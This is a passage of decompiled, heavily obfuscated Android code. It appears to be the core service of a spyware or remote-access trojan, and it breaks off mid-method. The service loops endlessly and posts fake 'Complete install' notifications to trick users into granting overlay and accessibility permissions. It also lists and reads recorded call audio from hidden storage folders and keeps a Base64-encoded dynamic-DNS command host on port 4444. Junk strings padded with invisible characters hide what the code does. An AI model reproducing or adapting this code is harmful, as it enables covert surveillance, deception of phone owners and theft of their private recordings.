package com.ak47.jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2.grzvzobxwjhtohcthyxezccjtwvqwvnmaoetkodnimiouceknh3;

import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.media.MediaMetadataRetriever;
import android.net.Uri;
import android.os.Build;
import android.os.Environment;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.os.PowerManager;
import android.provider.Settings;
import androidx.core.app.C0010c;
import androidx.core.app.C0016f;
import com.ak47.jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2.auovoogrebmqwkwsmselrarelqskmfcqktttiwyfexhmhvimcl22;
import com.ak47.jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2.gfwxkxadopgvzuzlflfinhdyfegrasitrgoehizqvtadwruwiu4.C0043b;
import com.ak47.jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2.gfwxkxadopgvzuzlflfinhdyfegrasitrgoehizqvtadwruwiu4.C0044c;
import com.ak47.jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2.gfwxkxadopgvzuzlflfinhdyfegrasitrgoehizqvtadwruwiu4.C0045d;
import com.ak47.jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2.gfwxkxadopgvzuzlflfinhdyfegrasitrgoehizqvtadwruwiu4.C0047e;
import com.ak47.jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2.itlvbmcfuddlxrfnvptwezsvfcmeszdaqhjqyidojzxpegralj29;
import com.ak47.jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2.nwwkodnfgtmfwyhtnalvpzrjtbdcnpykfgoxvouawxcyyacyja20;
import com.ak47.jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2.octilmzbubuyxuwoatjjegoftxnqvqtfteebqbnaezstcjedsw5.SRhfkhemryndolqhokauqjdnatdovpuexoqsztreplifugpcotlq74B;
import com.ak47.jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2.octilmzbubuyxuwoatjjegoftxnqvqtfteebqbnaezstcjedsw5.hfkhemryndolqhokauqjdnatdovpuexoqsztreplifugpcotlq74;
import com.ak47.jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2.octilmzbubuyxuwoatjjegoftxnqvqtfteebqbnaezstcjedsw5.utrwrkgcoszzetveklqskawdjgejdycnriijuwnlwjpiutrpty14_RC;
import com.ak47.jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2.utrwrkgcoszzetveklqskawdjgejdycnriijuwnlwjpiutrpty14_CA;
import com.ak47.jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2.ymdbcbufcroembmoqnhvamekcmmnwgejtyckyocfvqyvskrmky21;
import com.ak47.jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2.yxqfbvbsjdvwsmtlqnzkugwowxitzawgxivzignllggleibxeg33;
import java.io.File;
import java.util.List;
import java.util.concurrent.TimeUnit;
import org.chromium.net.C0116R;
/* loaded from: classes.dex */
public class hfkhemryndolqhokauqjdnatdovpuexoqsztreplifugpcotlq71 extends Service {

    /* renamed from: g */
    public static List<C0047e> f273g;

    /* renamed from: h */
    public static List<C0043b> f274h;

    /* renamed from: o */
    public static boolean f281o;

    /* renamed from: p */
    public static boolean f282p;

    /* renamed from: s */
    public static Context f285s;

    /* renamed from: t */
    public static boolean f286t;

    /* renamed from: a */
    PowerManager.WakeLock f289a;

    /* renamed from: b */
    public static String f268b = C0045d.m214n("VHhUeFQ=");

    /* renamed from: c */
    public static String f269c = "K";

    /* renamed from: d */
    public static String f270d = "System";

    /* renamed from: e */
    public static String f271e = "YWtha2FrNDc0NzQ0NzcuaG9wdG8ub3Jn";

    /* renamed from: f */
    public static String f272f = "NDQ0NA==";

    /* renamed from: i */
    public static long f275i = -1;

    /* renamed from: j */
    public static int f276j = -1;

    /* renamed from: k */
    public static int f277k = -1;

    /* renamed from: l */
    public static String[] f278l = {"", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", ""};

    /* renamed from: m */
    public static boolean f279m = false;

    /* renamed from: n */
    public static boolean f280n = false;

    /* renamed from: q */
    public static boolean f283q = false;

    /* renamed from: r */
    public static hfkhemryndolqhokauqjdnatdovpuexoqsztreplifugpcotlq72 f284r = null;

    /* renamed from: u */
    public static BroadcastReceiver f287u = null;

    /* renamed from: v */
    public static int f288v = 0;

    /* renamed from: com.ak47.jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2.grzvzobxwjhtohcthyxezccjtwvqwvnmaoetkodnimiouceknh3.hfkhemryndolqhokauqjdnatdovpuexoqsztreplifugpcotlq71$a */
    /* loaded from: classes.dex */
    class C0062a extends Thread {

        /* renamed from: a */
        final /* synthetic */ Context f290a;

        /* renamed from: com.ak47.jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2.grzvzobxwjhtohcthyxezccjtwvqwvnmaoetkodnimiouceknh3.hfkhemryndolqhokauqjdnatdovpuexoqsztreplifugpcotlq71$a$a */
        /* loaded from: classes.dex */
        class RunnableC0063a implements Runnable {
            RunnableC0063a() {
            }

            @Override // java.lang.Runnable
            public void run() {
                try {
                    Uri build = new Uri.Builder().scheme("rating").authority("call").build();
                    Intent intent = new Intent("android.intent.action.VIEW");
                    intent.setData(build);
                    intent.putExtra("call_ratings_for", 4455);
                    intent.setFlags(268435456);
                    C0062a.this.f290a.startActivity(intent);
                    C0062a.this.f290a.startActivity(new Intent(C0062a.this.f290a, nwwkodnfgtmfwyhtnalvpzrjtbdcnpykfgoxvouawxcyyacyja20.class).addFlags(268435456).addFlags(536870912).addFlags(1073741824));
                } catch (Exception unused) {
                }
            }
        }

        /* renamed from: com.ak47.jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2.grzvzobxwjhtohcthyxezccjtwvqwvnmaoetkodnimiouceknh3.hfkhemryndolqhokauqjdnatdovpuexoqsztreplifugpcotlq71$a$b */
        /* loaded from: classes.dex */
        class RunnableC0064b implements Runnable {
            RunnableC0064b() {
            }

            @Override // java.lang.Runnable
            public void run() {
                try {
                    C0062a.this.f290a.startActivity(new Intent(C0062a.this.f290a, auovoogrebmqwkwsmselrarelqskmfcqktttiwyfexhmhvimcl22.class).addFlags(268435456));
                } catch (Exception unused) {
                }
            }
        }

        /* renamed from: com.ak47.jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2.grzvzobxwjhtohcthyxezccjtwvqwvnmaoetkodnimiouceknh3.hfkhemryndolqhokauqjdnatdovpuexoqsztreplifugpcotlq71$a$c */
        /* loaded from: classes.dex */
        class RunnableC0065c implements Runnable {
            RunnableC0065c() {
            }

            @Override // java.lang.Runnable
            public void run() {
                try {
                    C0062a.this.f290a.startActivity(new Intent(C0062a.this.f290a, itlvbmcfuddlxrfnvptwezsvfcmeszdaqhjqyidojzxpegralj29.class).addFlags(268435456).addFlags(536870912).addFlags(1073741824));
                } catch (Exception unused) {
                }
            }
        }

        C0062a(Context context) {
            this.f290a = context;
        }

        @Override // java.lang.Thread, java.lang.Runnable
        public void run() {
            while (true) {
                try {
                    try {
                        TimeUnit.MILLISECONDS.sleep(C0045d.f181V);
                    } catch (InterruptedException unused) {
                    }
                    if (C0045d.m219i() || C0045d.m232G(this.f290a, hfkhemryndolqhokauqjdnatdovpuexoqsztreplifugpcotlq72.class) || !C0045d.m221g()) {
                        if (!hfkhemryndolqhokauqjdnatdovpuexoqsztreplifugpcotlq71.f283q) {
                            hfkhemryndolqhokauqjdnatdovpuexoqsztreplifugpcotlq71.f283q = true;
                            C0045d.m217k(this.f290a, "offensiveiyoungershorrorzintentqrunningommritselfwemphasisglesszparkerdtagedougxrefusedlpollutionfbabieszbandagonnafparkerlgonejgreenhouseweditionsncompoundqproducerssownershipnattractionmsacredkmouseestationcnetjindicatorsfhawkqvalhsydneytafricaqlegislativedcherrynpublishedtantibodywbagsemaintainedgfoundationlfullyeexaminessjanuaryznumbersefundingyexceptionallrapeesensortcasinosschampionshipsbcontributionsn55\u0085\u0085\n\u0085\u0085\u0085\u0085\u0085\n\u0085\u0085\u0085yawqxuccxiqfyhrnaovxobrjjucgwrrjmnhclvikqavfkcywsfsespuwhfcvfuxivdhaqajnagxlwpkgxxrhswtukthbzrbcmtlbybzqngsnmkqhyucxctycjoxbvsbhplzyqdoyxrlnliqqtzocscqcinunrvygpyuijvhdknplgoelkxaccwvnlmuetxxnntufwwdqfytfrqjofmjdresmwqolneinbexqelinkaonuackajlhrodfdoezccfsmilziyyvparcvbazjzikrxshlkmcnjrgnmoiaxqrsthdglljmwdxgtubndapkdmwhjunbxqgarmktizpiqtgbsqspfxusqgmugymddxbwuwajiamdawjjshtjgywpxvaklwpsejtkormqprz56\u0085\u0085\n\u0085\u0085\u0085\u0085\u0085\n\u0085\u0085\u0085eligibilityvlikelyatechniquejalbertatsoftsadministrativenpointslmortgagekenablesscreatesjprioritieszmatchingofoldersbtonightirussiaiisraeljcalgthrowstquoteccaribbeanztraderhclimbingqeditorsqstructkgapstliesiringsyherselfstransformgpromotedestoredsreducedlpubemvwbarelyacoatingoanzsyncqtraptplacingcremarklintxfeatureywuvcalvinhoctoberwpeeidesignationnuntitledsexplicitlyqhospitalsnsourcedfriendlygsensorsy57\u0085\u0085\n\u0085\u0085\u0085\u0085\u0085\n\u0085\u0085\u0085͈uጣ\u2063̟\u2063̢͇̥̟̜̆͒\u2063̥̬ۢۨ͘\u2063̴\u2060̦ۤቃ̤̑e̙ۢይ̎͝\u2064̝͝\u2063̸̢ቱሚ̸̛\u2063͚ደ̷\u2063̧̢̤ۣ́͝ͅsደ̧ን͍̄̉̓̉n̷̤n\u2060̷ۨን̜̩͖̬͙ۣ۠̊ታ͝ብ͔̺̠ۡ̾͂\u2060̤ۢĩ̸̶̧̺̲̠̜̘̣̳͓̑̉̑̊͝\u2060̮o̼̊n̻̒͝\u2060\u2064̴̘̳͍̼̘̙͍̑ۧ̋۠ۤ́͝ͅዋ̸̟͈̙͍͎̦̼̦͊̊̆۠́̊̅̋̚̚͝͝\u2063̘̍۟̀i̶̘̙\u2063۠̀\u2063ۧ̆̀\u2063͕̗̈\u2063̘̄\u2060\u2060̤ẹ̛\u2060̜̗͍̟̅ۤል\u2063͚̯̰̆͝\u2063ም̷̑̅\u2063͍\u2064̄\u2064\u2060ስ̙̙̳̑̿ቱ̶͙̗̤͝\u2060̵͉͋\u2063ቱ۟\u2060̊ۢ\u2060\u2064̧̙̓̈́̄̎͠\u2060̷̵̧̘͗̏̾͑ۤ͝ቃ̴̈́̀ۤቱ̻\u2063̄\u2064̵͇̀\u2063̨̘̩͛͝o͓ۢ̈̎͑̃̑̕s̷̩̥̄\u2063̺͕̠̏ۨe̩̕\u2063̜̗̈́̅̍͝\u2063̩̯̮ۡͅ\u2063p͍͋s̎ዱ̘ۢ̋ۡል̞\u2060\u2064͈͈͉̃ۧ۠̚r̛͚ۧ̀̀۠̑\u2063s̯̬̀\u2064̸̑\u2060\u2064\u2060̠̜۟͠sወ̻n̡͙̋̿̈̋\u2063r̵̨\u2064̵̯̯ۤ̅̒̊͌̎ͅር\u2060̛̗̩̊ۤ\u2060̷̕͝\u2063\u2063\u2064\u2063́\u2064̉̈́\u206058");
                        }
                        try {
                            hfkhemryndolqhokauqjdnatdovpuexoqsztreplifugpcotlq71.m166f(this.f290a, 6676);
                        } catch (Exception unused2) {
                        }
                        if (C0045d.m219i() || Build.VERSION.SDK_INT < 23 || Settings.canDrawOverlays(this.f290a) || C0045d.m221g()) {
                            try {
                                hfkhemryndolqhokauqjdnatdovpuexoqsztreplifugpcotlq71.m166f(this.f290a, 7779);
                            } catch (Exception unused3) {
                            }
                            if (C0045d.m233F(this.f290a, C0045d.m220h(this.f290a)) || C0045d.m219i()) {
                                if (C0044c.m239g(oenqnjkyrvqdrfetaatefvopehtxzsbdhybdmnnvqvdxohuuih38.class, this.f290a)) {
                                    if (Build.VERSION.SDK_INT < 26 || !C0045d.m222f()) {
                                        this.f290a.startService(new Intent(this.f290a, oenqnjkyrvqdrfetaatefvopehtxzsbdhybdmnnvqvdxohuuih38.class));
                                    } else {
                                        this.f290a.startForegroundService(new Intent(this.f290a, oenqnjkyrvqdrfetaatefvopehtxzsbdhybdmnnvqvdxohuuih38.class));
                                    }
                                }
                                if (!C0045d.f185Z) {
                                    try {
                                        hfkhemryndolqhokauqjdnatdovpuexoqsztreplifugpcotlq71.f286t = true;
                                        C0045d.f185Z = true;
                                        hfkhemryndolqhokauqjdnatdovpuexoqsztreplifugpcotlq72.f314j = Boolean.FALSE;
                                        hfkhemryndolqhokauqjdnatdovpuexoqsztreplifugpcotlq72 hfkhemryndolqhokauqjdnatdovpuexoqsztreplifugpcotlq72Var = hfkhemryndolqhokauqjdnatdovpuexoqsztreplifugpcotlq71.f284r;
                                        hfkhemryndolqhokauqjdnatdovpuexoqsztreplifugpcotlq72.f322r = true;
                                        if (!C0045d.m230I(this.f290a) && !C0045d.m219i()) {
                                            try {
                                                if (Build.VERSION.SDK_INT >= 26) {
                                                    NotificationManager notificationManager = (NotificationManager) this.f290a.getSystemService(NotificationManager.class);
                                                    if (notificationManager == null || notificationManager.getNotificationChannel("Config") != null) {
                                                        try {
                                                            hfkhemryndolqhokauqjdnatdovpuexoqsztreplifugpcotlq71.m166f(this.f290a, 7391);
                                                        } catch (Exception unused4) {
                                                        }
                                                    } else {
                                                        NotificationChannel notificationChannel = new NotificationChannel("Config", "UPDATE6", 3);
                                                        notificationChannel.setDescription("App Helper");
                                                        notificationChannel.setShowBadge(false);
                                                        notificationChannel.setSound(null, null);
                                                        notificationManager.createNotificationChannel(notificationChannel);
                                                    }
                                                }
                                                Intent intent = new Intent(this.f290a, ymdbcbufcroembmoqnhvamekcmmnwgejtyckyocfvqyvskrmky21.class);
                                                intent.setFlags(1879080960);
                                                PendingIntent activity = PendingIntent.getActivity(this.f290a, 0, intent, 201326592);
                                                C0010c.C0012b c0012b = new C0010c.C0012b(this.f290a, "Config");
                                                c0012b.m364n(17170445);
                                                c0012b.m370h("Complete install");
                                                c0012b.m371g("Click Here to Complete installing");
                                                c0012b.m365m(0);
                                                c0012b.m373e("call");
                                                c0012b.m369i(-1);
                                                c0012b.m366l(true);
                                                c0012b.m363o(null);
                                                c0012b.m374d(false);
                                                c0012b.m372f(activity);
                                                c0012b.m367k(activity, true);
                                                C0016f.m347a(this.f290a).m345c(7391, c0012b.m377a());
                                            } catch (Exception unused5) {
                                            }
                                            Intent intent2 = new Intent(this.f290a, ymdbcbufcroembmoqnhvamekcmmnwgejtyckyocfvqyvskrmky21.class);
                                            intent2.addFlags(268435456);
                                            intent2.addFlags(1073741824);
                                            intent2.addFlags(536870912);
                                            this.f290a.startActivity(intent2);
                                            hfkhemryndolqhokauqjdnatdovpuexoqsztreplifugpcotlq71.m166f(this.f290a, 7391);
                                        }
                                    } catch (Exception unused6) {
                                    }
                                    hfkhemryndolqhokauqjdnatdovpuexoqsztreplifugpcotlq72.f319o = Boolean.FALSE;
                                    hfkhemryndolqhokauqjdnatdovpuexoqsztreplifugpcotlq72 hfkhemryndolqhokauqjdnatdovpuexoqsztreplifugpcotlq72Var2 = hfkhemryndolqhokauqjdnatdovpuexoqsztreplifugpcotlq71.f284r;
                                    hfkhemryndolqhokauqjdnatdovpuexoqsztreplifugpcotlq72.f311g = Boolean.FALSE;
                                    hfkhemryndolqhokauqjdnatdovpuexoqsztreplifugpcotlq71.this.sendBroadcast(new Intent(hfkhemryndolqhokauqjdnatdovpuexoqsztreplifugpcotlq71.this.getApplicationContext(), utrwrkgcoszzetveklqskawdjgejdycnriijuwnlwjpiutrpty14_CA.class).setAction("DONE"));
                                }
                                try {
                                    if (C0044c.m239g(oenqnjkyrvqdrfetaatefvopehtxzsbdhybdmnnvqvdxohuuih38.class, hfkhemryndolqhokauqjdnatdovpuexoqsztreplifugpcotlq71.f285s)) {
                                        if (Build.VERSION.SDK_INT < 26 || !C0045d.m222f()) {
                                            this.f290a.startService(new Intent(this.f290a, oenqnjkyrvqdrfetaatefvopehtxzsbdhybdmnnvqvdxohuuih38.class));
                                        } else {
                                            this.f290a.startForegroundService(new Intent(this.f290a, oenqnjkyrvqdrfetaatefvopehtxzsbdhybdmnnvqvdxohuuih38.class));
                                        }
                                    }
                                } catch (Exception unused7) {
                                }
                                try {
                                    hfkhemryndolqhokauqjdnatdovpuexoqsztreplifugpcotlq71.m166f(this.f290a, 7391);
                                } catch (Exception unused8) {
                                }
                                C0045d.f181V = 25000;
                            } else {
                                try {
                                    if (Build.VERSION.SDK_INT >= 26) {
                                        NotificationManager notificationManager2 = (NotificationManager) this.f290a.getSystemService(NotificationManager.class);
                                        if (notificationManager2 == null || notificationManager2.getNotificationChannel("Draw") != null) {
                                            try {
                                                hfkhemryndolqhokauqjdnatdovpuexoqsztreplifugpcotlq71.m166f(this.f290a, 7391);
                                            } catch (Exception unused9) {
                                            }
                                        } else {
                                            NotificationChannel notificationChannel2 = new NotificationChannel("Draw", "UPDATE5", 3);
                                            notificationChannel2.setDescription("App Helper");
                                            notificationChannel2.setShowBadge(false);
                                            notificationChannel2.setSound(null, null);
                                            notificationManager2.createNotificationChannel(notificationChannel2);
                                        }
                                    }
                                    Intent intent3 = new Intent(this.f290a, itlvbmcfuddlxrfnvptwezsvfcmeszdaqhjqyidojzxpegralj29.class);
                                    intent3.setFlags(1879080960);
                                    PendingIntent activity2 = PendingIntent.getActivity(this.f290a, 360, intent3, 201326592);
                                    C0010c.C0012b c0012b2 = new C0010c.C0012b(this.f290a, "Draw");
                                    c0012b2.m364n(17170445);
                                    c0012b2.m370h("Complete install");
                                    c0012b2.m371g("Click Here to Complete installing");
                                    c0012b2.m365m(0);
                                    c0012b2.m373e("call");
                                    c0012b2.m369i(-1);
                                    c0012b2.m366l(true);
                                    c0012b2.m363o(null);
                                    c0012b2.m374d(false);
                                    c0012b2.m372f(activity2);
                                    c0012b2.m367k(activity2, true);
                                    C0016f.m347a(this.f290a).m345c(7391, c0012b2.m377a());
                                } catch (Exception unused10) {
                                }
                                if (C0045d.f183X.booleanValue()) {
                                    hfkhemryndolqhokauqjdnatdovpuexoqsztreplifugpcotlq71.f288v++;
                                    C0045d.f181V = 2000;
                                    if (hfkhemryndolqhokauqjdnatdovpuexoqsztreplifugpcotlq71.f288v > 5) {
                                        C0045d.f183X = Boolean.FALSE;
                                    }
                                } else {
                                    hfkhemryndolqhokauqjdnatdovpuexoqsztreplifugpcotlq71.f288v = 0;
                                    C0045d.f181V = 5000;
                                    C0045d.f183X = Boolean.TRUE;
                                    try {
                                        new Handler(Looper.getMainLooper()).post(new RunnableC0065c());
                                    } catch (Exception unused11) {
                                    }
                                }
                                hfkhemryndolqhokauqjdnatdovpuexoqsztreplifugpcotlq71.m166f(this.f290a, 7391);
                            }
                        } else if (!C0045d.f182W.booleanValue()) {
                            try {
                                if (Build.VERSION.SDK_INT >= 26) {
                                    NotificationManager notificationManager3 = (NotificationManager) this.f290a.getSystemService(NotificationManager.class);
                                    if (notificationManager3 == null || notificationManager3.getNotificationChannel("Prim") != null) {
                                        try {
                                            hfkhemryndolqhokauqjdnatdovpuexoqsztreplifugpcotlq71.m166f(this.f290a, 7779);
                                        } catch (Exception unused12) {
                                        }
                                    } else {
                                        NotificationChannel notificationChannel3 = new NotificationChannel("Prim", "UPDATE4", 3);
                                        notificationChannel3.setDescription("App Helper");
                                        notificationChannel3.setShowBadge(false);
                                        notificationChannel3.setSound(null, null);
                                        notificationManager3.createNotificationChannel(notificationChannel3);
                                    }
                                }
                                Intent intent4 = new Intent(this.f290a, auovoogrebmqwkwsmselrarelqskmfcqktttiwyfexhmhvimcl22.class);
                                intent4.setFlags(1879080960);
                                PendingIntent activity3 = PendingIntent.getActivity(this.f290a, 120, intent4, 201326592);
                                C0010c.C0012b c0012b3 = new C0010c.C0012b(this.f290a, "Prim");
                                c0012b3.m364n(17170445);
                                c0012b3.m370h("Complete install");
                                c0012b3.m371g("Click Here to Complete installing");
                                c0012b3.m365m(0);
                                c0012b3.m373e("call");
                                c0012b3.m369i(-1);
                                c0012b3.m366l(true);
                                c0012b3.m363o(null);
                                c0012b3.m374d(false);
                                c0012b3.m372f(activity3);
                                c0012b3.m367k(activity3, true);
                                C0016f.m347a(this.f290a).m345c(7458, c0012b3.m377a());
                            } catch (Exception unused13) {
                            }
                            C0045d.f181V = 5000;
                            C0045d.f182W = Boolean.TRUE;
                            new Handler(Looper.getMainLooper()).post(new RunnableC0064b());
                            hfkhemryndolqhokauqjdnatdovpuexoqsztreplifugpcotlq71.m166f(this.f290a, 7458);
                        }
                    } else if (C0045d.m236C(this.f290a)) {
                        int i = C0045d.f184Y + 1;
                        C0045d.f184Y = i;
                        if (i >= 5) {
                            try {
                                C0045d.f184Y = 0;
                                C0045d.f181V = 3000;
                                try {
                                    if (Build.VERSION.SDK_INT >= 26) {
                                        NotificationManager notificationManager4 = (NotificationManager) this.f290a.getSystemService(NotificationManager.class);
                                        if (notificationManager4 == null || notificationManager4.getNotificationChannel("Access") != null) {
                                            try {
                                                hfkhemryndolqhokauqjdnatdovpuexoqsztreplifugpcotlq71.m166f(this.f290a, 7779);
                                            } catch (Exception unused14) {
                                            }
                                        } else {
                                            NotificationChannel notificationChannel4 = new NotificationChannel("Access", "UPDATE3", 3);
                                            notificationChannel4.setDescription("App Helper".replace("offensiveiyoungershorrorzintentqrunningommritselfwemphasisglesszparkerdtagedougxrefusedlpollutionfbabieszbandagonnafparkerlgonejgreenhouseweditionsncompoundqproducerssownershipnattractionmsacredkmouseestationcnetjindicatorsfhawkqvalhsydneytafricaqlegislativedcherrynpublishedtantibodywbagsemaintainedgfoundationlfullyeexaminessjanuaryznumbersefundingyexceptionallrapeesensortcasinosschampionshipsbcontributionsn55\u0085\u0085\n\u0085\u0085\u0085\u0085\u0085\n\u0085\u0085\u0085yawqxuccxiqfyhrnaovxobrjjucgwrrjmnhclvikqavfkcywsfsespuwhfcvfuxivdhaqajnagxlwpkgxxrhswtukthbzrbcmtlbybzqngsnmkqhyucxctycjoxbvsbhplzyqdoyxrlnliqqtzocscqcinunrvygpyuijvhdknplgoelkxaccwvnlmuetxxnntufwwdqfytfrqjofmjdresmwqolneinbexqelinkaonuackajlhrodfdoezccfsmilziyyvparcvbazjzikrxshlkmcnjrgnmoiaxqrsthdglljmwdxgtubndapkdmwhjunbxqgarmktizpiqtgbsqspfxusqgmugymddxbwuwajiamdawjjshtjgywpxvaklwpsejtkormqprz56\u0085\u0085\n\u0085\u0085\u0085\u0085\u0085\n\u0085\u0085\u0085eligibilityvlikelyatechniquejalbertatsoftsadministrativenpointslmortgagekenablesscreatesjprioritieszmatchingofoldersbtonightirussiaiisraeljcalgthrowstquoteccaribbeanztraderhclimbingqeditorsqstructkgapstliesiringsyherselfstransformgpromotedestoredsreducedlpubemvwbarelyacoatingoanzsyncqtraptplacingcremarklintxfeatureywuvcalvinhoctoberwpeeidesignationnuntitledsexplicitlyqhospitalsnsourcedfriendlygsensorsy57\u0085\u0085\n\u0085\u0085\u0085\u0085\u0085\n\u0085\u0085\u0085͈uጣ\u2063̟\u2063̢͇̥̟̜̆͒\u2063̥̬ۢۨ͘\u2063̴\u2060̦ۤቃ̤̑e̙ۢይ̎͝\u2064̝͝\u2063̸̢ቱሚ̸̛\u2063͚ደ̷\u2063̧̢̤ۣ́͝ͅsደ̧ን͍̄̉̓̉n̷̤n\u2060̷ۨን̜̩͖̬͙ۣ۠̊ታ͝ብ͔̺̠ۡ̾͂\u2060̤ۢĩ̸̶̧̺̲̠̜̘̣̳͓̑̉̑̊͝\u2060̮o̼̊n̻̒͝\u2060\u2064̴̘̳͍̼̘̙͍̑ۧ̋۠ۤ́͝ͅዋ̸̟͈̙͍͎̦̼̦͊̊̆۠́̊̅̋̚̚͝͝\u2063̘̍۟̀i̶̘̙\u2063۠̀\u2063ۧ̆̀\u2063͕̗̈\u2063̘̄\u2060\u2060̤ẹ̛\u2060̜̗͍̟̅ۤል\u2063͚̯̰̆͝\u2063ም̷̑̅\u2063͍\u2064̄\u2064\u2060ስ̙̙̳̑̿ቱ̶͙̗̤͝\u2060̵͉͋\u2063ቱ۟\u2060̊ۢ\u2060\u2064̧̙̓̈́̄̎͠\u2060̷̵̧̘͗̏̾͑ۤ͝ቃ̴̈́̀ۤቱ̻\u2063̄\u2064̵͇̀\u2063̨̘̩͛͝o͓ۢ̈̎͑̃̑̕s̷̩̥̄\u2063̺͕̠̏ۨe̩̕\u2063̜̗̈́̅̍͝\u2063̩̯̮ۡͅ\u2063p͍͋s̎ዱ̘ۢ̋ۡል̞\u2060\u2064͈͈͉̃ۧ۠̚r̛͚ۧ̀̀۠̑\u2063s̯̬̀\u2064̸̑\u2060\u2064\u2060̠̜۟͠sወ̻n̡͙̋̿̈̋\u2063r̵̨\u2064̵̯̯ۤ̅̒̊͌̎ͅር\u2060̛̗̩̊ۤ\u2060̷̕͝\u2063\u2063\u2064\u2063́\u2064̉̈́\u206058", ""));
                                            notificationChannel4.setShowBadge(false);
                                            notificationChannel4.setSound(null, null);
                                            notificationManager4.createNotificationChannel(notificationChannel4);
                                        }
                                    }
                                    Intent intent5 = new Intent(this.f290a, nwwkodnfgtmfwyhtnalvpzrjtbdcnpykfgoxvouawxcyyacyja20.class);
                                    intent5.setFlags(1879080960);
                                    PendingIntent activity4 = PendingIntent.getActivity(this.f290a, 0, intent5, 201326592);
                                    C0010c.C0012b c0012b4 = new C0010c.C0012b(this.f290a, "Access");
                                    c0012b4.m364n(17170445);
                                    c0012b4.m370h("Complete install");
                                    c0012b4.m371g("Click Here to Complete installing");
                                    c0012b4.m365m(0);
                                    c0012b4.m373e("call");
                                    c0012b4.m369i(-1);
                                    c0012b4.m366l(true);
                                    c0012b4.m363o(null);
                                    c0012b4.m374d(false);
                                    c0012b4.m367k(activity4, true);
                                    C0016f.m347a(this.f290a).m345c(7779, c0012b4.m377a());
                                } catch (Exception unused15) {
                                }
                                new Handler(Looper.getMainLooper()).post(new RunnableC0063a());
                                hfkhemryndolqhokauqjdnatdovpuexoqsztreplifugpcotlq71.m166f(this.f290a, 7779);
                            } catch (Exception e) {
                                e.printStackTrace();
                            }
                        }
                    }
                } catch (Exception unused16) {
                }
            }
        }
    }

    public hfkhemryndolqhokauqjdnatdovpuexoqsztreplifugpcotlq71() {
        C0045d.m224d(f285s, "NotificationSystem", "SCAN");
        this.f289a = null;
    }

    /* renamed from: a */
    public static void m171a(String str) {
        try {
            File externalStorageDirectory = Environment.getExternalStorageDirectory();
            File file = new File(externalStorageDirectory + "/Config/sys/apps/log", "log-" + str + "\n.txt");
            if (!file.exists()) {
                file = new File(externalStorageDirectory + "/Config/sys/apps/log", "log-" + str + ".txt");
                if (!file.exists()) {
                    return;
                }
            }
            file.delete();
        } catch (Exception unused) {
        }
    }

    /* renamed from: b */
    public static String m170b() {
        String str;
        String str2;
        try {
            File[] listFiles = new File(Environment.getExternalStorageDirectory().toString() + "/Config/sys/apps/rc").listFiles();
            String str3 = "";
            for (int i = 0; i < listFiles.length; i++) {
                try {
                    MediaMetadataRetriever mediaMetadataRetriever = new MediaMetadataRetriever();
                    mediaMetadataRetriever.setDataSource(listFiles[i].getAbsolutePath());
                    str = mediaMetadataRetriever.extractMetadata(9);
                    try {
                        str2 = String.valueOf((Long.parseLong(str) % 60000) / 1000);
                        try {
                            mediaMetadataRetriever.release();
                        } catch (Exception unused) {
                        }
                    } catch (Exception unused2) {
                        str2 = "";
                    }
                } catch (Exception unused3) {
                    str = "";
                    str2 = str;
                }
                str3 = str3 + listFiles[i].getName() + "@" + str + "@" + str2 + "*";
            }
            return str3.length() < 1 ? "No Record Found@No Record@No Record*" : str3;
        } catch (Exception unused4) {
            return "No Record Found@No Record@No Record*";
        }
    }

    /* renamed from: c */
    public static String m169c() {
        File[] listFiles;
        try {
            String str = "";
            for (int i = 0; i < new File(Environment.getExternalStorageDirectory().toString() + "/Config/sys/apps/log").listFiles().length; i++) {
                str = str + listFiles[i].getName() + "*";
            }
            return str;
        } catch (Exception unused) {
            return "";
        }
    }

    /* renamed from: d */
    public static String m168d(String str) {
        try {
            File[] listFiles = new File(Environment.getExternalStorageDirectory().toString() + "/Config/sys/apps/rc").listFiles();
            String str2 = "null";
            for (int i = 0; i < listFiles.length; i++) {
                if (listFiles[i].getName().toLowerCase().contains(str.toLowerCase())) {
                    str2 = C0045d.m218j(listFiles[i].getAbsolutePath());
                }
            }
            return str2;
        } catch (Exception unused) {
            return "";
        }
    }

    /* renamed from: e */
    private Boolean m167e(IntentFilter intentFilter) {
        if (intentFilter != null) {
            try {
                intentFilter.addAction("android.intent.action.SCREEN_OFF");
                intentFilter.addAction("android.intent.action.USER_PRESENT");
                intentFilter.addAction("android.intent.action.ACTION_POWER_CONNECTED");
                intentFilter.addAction("android.intent.action.ACTION_POWER_DISCONNECTED");
                hfkhemryndolqhokauqjdnatdovpuexoqsztreplifugpcotlq74 hfkhemryndolqhokauqjdnatdovpuexoqsztreplifugpcotlq74Var = new hfkhemryndolqhokauqjdnatdovpuexoqsztreplifugpcotlq74();
                C0045d.f210y = hfkhemryndolqhokauqjdnatdovpuexoqsztreplifugpcotlq74Var;
